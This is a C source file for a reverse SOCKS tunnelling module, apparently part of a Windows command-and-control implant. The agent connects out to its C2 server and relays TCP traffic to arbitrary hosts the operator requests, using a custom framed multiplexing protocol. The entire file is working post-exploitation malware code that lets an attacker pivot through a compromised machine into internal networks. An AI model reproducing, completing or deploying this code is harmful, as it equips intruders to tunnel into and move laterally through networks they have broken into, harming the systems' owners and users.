/* rsocks.c — Reverse SOCKS mux client for the C agent.
 * Agent dials C2 callback port. Frame: [sid:u32LE][type:u8][len:u32LE][payload]
 * SYN=1, DATA=2, FIN=3, OK=4, ERR=5
 */
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include "api_resolve.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "config.h"
#include "rsocks.h"

#pragma comment(lib, "ws2_32.lib")

#define RS_SYN  1
#define RS_DATA 2
#define RS_FIN  3
#define RS_OK   4
#define RS_ERR  5
#define MAX_STREAMS 512

static volatile SOCKET g_rs_c2   = INVALID_SOCKET;
static volatile int    g_rs_stop = 1;
static HANDLE          g_rs_thr  = NULL;

typedef struct { uint32_t sid; SOCKET tsock; } StreamEntry;
static StreamEntry g_streams[MAX_STREAMS];
static CRITICAL_SECTION g_rs_write_cs, g_rs_stream_cs;
static int g_cs_inited = 0;

static void rs_cs_init(void) {
    if (!g_cs_inited) {
        g_cs_inited = 1;
        InitializeCriticalSection(&g_rs_write_cs);
        InitializeCriticalSection(&g_rs_stream_cs);
        for (int i = 0; i < MAX_STREAMS; i++) {
            g_streams[i].sid   = 0xFFFFFFFF;
            g_streams[i].tsock = INVALID_SOCKET;
        }
    }
}

static void rs_write_frame(uint32_t sid, uint8_t ft, const void *data, uint32_t dlen) {
    uint8_t hdr[9];
    memcpy(hdr,   &sid,  4);
    hdr[4] = ft;
    memcpy(hdr+5, &dlen, 4);
    EnterCriticalSection(&g_rs_write_cs);
    if (g_rs_c2 != INVALID_SOCKET) {
        send((SOCKET)g_rs_c2, (const char*)hdr, 9, 0);
        if (dlen > 0 && data) send((SOCKET)g_rs_c2, (const char*)data, (int)dlen, 0);
    }
    LeaveCriticalSection(&g_rs_write_cs);
}

typedef struct { uint32_t sid; SOCKET tsock; } RelayParam;

static DWORD WINAPI relay_proc(LPVOID p) {
    RelayParam *rp = (RelayParam*)p;
    uint32_t sid = rp->sid; SOCKET ts = rp->tsock; free(rp);
    char buf[32768];
    while (!g_rs_stop) {
        int n = recv(ts, buf, sizeof(buf), 0);
        if (n <= 0) break;
        rs_write_frame(sid, RS_DATA, buf, (uint32_t)n);
    }
    /* clean up stream table */
    EnterCriticalSection(&g_rs_stream_cs);
    int idx = (int)(sid % MAX_STREAMS);
    if (g_streams[idx].tsock == ts) { g_streams[idx].sid = 0xFFFFFFFF; g_streams[idx].tsock = INVALID_SOCKET; }
    LeaveCriticalSection(&g_rs_stream_cs);
    closesocket(ts);
    rs_write_frame(sid, RS_FIN, NULL, 0);
    return 0;
}

typedef struct { uint32_t sid; char target[512]; } SynParam;

static DWORD WINAPI syn_proc(LPVOID p) {
    SynParam *sp = (SynParam*)p;
    uint32_t sid = sp->sid;
    char *colon = strrchr(sp->target, ':');
    if (!colon) { char e[] = "invalid target"; rs_write_frame(sid, RS_ERR, e, (uint32_t)strlen(e)); free(sp); return 1; }
    *colon = '\0';
    int port = atoi(colon+1);
    char host[256]; strncpy(host, sp->target, sizeof(host)-1); free(sp);
    struct addrinfo hints = {0}, *res = NULL;
    char port_str[8]; snprintf(port_str, sizeof(port_str), "%d", port);
    hints.ai_family = AF_INET; hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(host, port_str, &hints, &res) != 0 || !res) {
        char e[64]; snprintf(e, sizeof(e), "resolve failed: %s", host);
        rs_write_frame(sid, RS_ERR, e, (uint32_t)strlen(e)); return 1;
    }
    SOCKET ts = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ts == INVALID_SOCKET) { freeaddrinfo(res); char e[]="socket failed"; rs_write_frame(sid,RS_ERR,e,(uint32_t)strlen(e)); return 1; }
    if (connect(ts, res->ai_addr, (int)res->ai_addrlen) != 0) {
        freeaddrinfo(res); closesocket(ts);
        char e[64]; snprintf(e, sizeof(e), "connect failed: %s:%d", host, port);
        rs_write_frame(sid, RS_ERR, e, (uint32_t)strlen(e)); return 1;
    }
    freeaddrinfo(res);
    EnterCriticalSection(&g_rs_stream_cs);
    int idx = (int)(sid % MAX_STREAMS);
    g_streams[idx].sid   = sid;
    g_streams[idx].tsock = ts;
    LeaveCriticalSection(&g_rs_stream_cs);
    rs_write_frame(sid, RS_OK, NULL, 0);
    RelayParam *rp = (RelayParam*)malloc(sizeof(RelayParam));
    rp->sid = sid; rp->tsock = ts;
    HANDLE h = CreateThread(NULL, 0, relay_proc, rp, 0, NULL);
    if (h) CloseHandle(h);
    return 0;
}

static int recv_exact(SOCKET s, void *buf, int n) {
    int got = 0;
    while (got < n) { int r = recv(s, (char*)buf+got, n-got, 0); if (r <= 0) return 0; got += r; }
    return 1;
}

static DWORD WINAPI rs_main_proc(LPVOID p) {
    (void)p;
    uint8_t hdr[9];
    while (!g_rs_stop) {
        if (!recv_exact((SOCKET)g_rs_c2, hdr, 9)) break;
        uint32_t sid; memcpy(&sid, hdr, 4);
        uint8_t ft = hdr[4];
        uint32_t pay_len; memcpy(&pay_len, hdr+5, 4);
        void *payload = NULL;
        if (pay_len > 0) {
            payload = malloc(pay_len+1);
            if (!payload || !recv_exact((SOCKET)g_rs_c2, payload, (int)pay_len)) { free(payload); break; }
            ((char*)payload)[pay_len] = '\0';
        }
        switch (ft) {
        case RS_SYN: {
            SynParam *sp = (SynParam*)malloc(sizeof(SynParam));
            sp->sid = sid;
            strncpy(sp->target, payload ? (char*)payload : "", sizeof(sp->target)-1);
            free(payload); payload = NULL;
            HANDLE h = CreateThread(NULL, 0, syn_proc, sp, 0, NULL);
            if (h) CloseHandle(h);
            break; }
        case RS_DATA: {
            int idx = (int)(sid % MAX_STREAMS);
            EnterCriticalSection(&g_rs_stream_cs);
            SOCKET ts = g_streams[idx].tsock;
            LeaveCriticalSection(&g_rs_stream_cs);
            if (ts != INVALID_SOCKET && pay_len > 0 && payload)
                send(ts, (const char*)payload, (int)pay_len, 0);
            break; }
        case RS_FIN: {
            int idx = (int)(sid % MAX_STREAMS);
            EnterCriticalSection(&g_rs_stream_cs);
            if (g_streams[idx].sid == sid && g_streams[idx].tsock != INVALID_SOCKET) {
                closesocket(g_streams[idx].tsock);
                g_streams[idx].tsock = INVALID_SOCKET; g_streams[idx].sid = 0xFFFFFFFF;
            }
            LeaveCriticalSection(&g_rs_stream_cs);
            break; }
        default: break;
        }
        if (payload) free(payload);
    }
    g_rs_stop = 1;
    /* close all streams */
    EnterCriticalSection(&g_rs_stream_cs);
    for (int i = 0; i < MAX_STREAMS; i++) {
        if (g_streams[i].tsock != INVALID_SOCKET) { closesocket(g_streams[i].tsock); g_streams[i].tsock = INVALID_SOCKET; g_streams[i].sid = 0xFFFFFFFF; }
    }
    LeaveCriticalSection(&g_rs_stream_cs);
    if (g_rs_c2 != INVALID_SOCKET) { closesocket((SOCKET)g_rs_c2); g_rs_c2 = INVALID_SOCKET; }
    return 0;
}

static char *parse_c2_host(char *out, size_t outsz) {
    const char *url = AGENT_SERVER_URL;
    if (strncmp(url, "https://", 8) == 0) url += 8;
    else if (strncmp(url, "http://",  7) == 0) url += 7;
    const char *end = strchr(url, '/'); if (!end) end = url + strlen(url);
    size_t len = (size_t)(end - url);
    if (len >= outsz) len = outsz - 1;
    strncpy(out, url, len); out[len] = '\0';
    /* strip :port */
    char *colon = strrchr(out, ':');
    if (colon) *colon = '\0';
    return out;
}

char *rsocks_start(const char *port_str) {
    WSADATA wsa; WSAStartup(MAKEWORD(2,2), &wsa);
    rs_cs_init();
    if (!g_rs_stop || g_rs_c2 != INVALID_SOCKET) {
        return _strdup("[-] rsocks already running");
    }
    int port = atoi(port_str);
    if (port <= 0 || port > 65535) {
        char *e = (char*)malloc(64); snprintf(e, 64, "[-] rsocks: invalid port: %s", port_str); return e;
    }
    char host[256]; parse_c2_host(host, sizeof(host));
    char port_s[8]; snprintf(port_s, sizeof(port_s), "%d", port);
    struct addrinfo hints = {0}, *res = NULL;
    hints.ai_family = AF_INET; hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(host, port_s, &hints, &res) != 0 || !res) {
        char *e = (char*)malloc(128); snprintf(e, 128, "[-] rsocks: resolve failed: %s", host); return e;
    }
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) { freeaddrinfo(res); return _strdup("[-] rsocks: socket() failed"); }
    if (connect(s, res->ai_addr, (int)res->ai_addrlen) != 0) {
        freeaddrinfo(res); closesocket(s);
        char *e = (char*)malloc(128); snprintf(e, 128, "[-] rsocks: connect %s:%s failed", host, port_str); return e;
    }
    freeaddrinfo(res);
    g_rs_c2   = s;
    g_rs_stop = 0;
    g_rs_thr  = CreateThread(NULL, 0, rs_main_proc, NULL, 0, NULL);
    if (!g_rs_thr) { g_rs_stop = 1; closesocket(s); g_rs_c2 = INVALID_SOCKET; return _strdup("[-] rsocks: CreateThread failed"); }
    char *out = (char*)malloc(128); snprintf(out, 128, "[+] rsocks connected to %s:%s", host, port_str); return out;
}

void rsocks_stop(void) {
    g_rs_stop = 1;
    if (g_rs_c2 != INVALID_SOCKET) { closesocket((SOCKET)g_rs_c2); }
    if (g_rs_thr) { WaitForSingleObject(g_rs_thr, 3000); CloseHandle(g_rs_thr); g_rs_thr = NULL; }
}
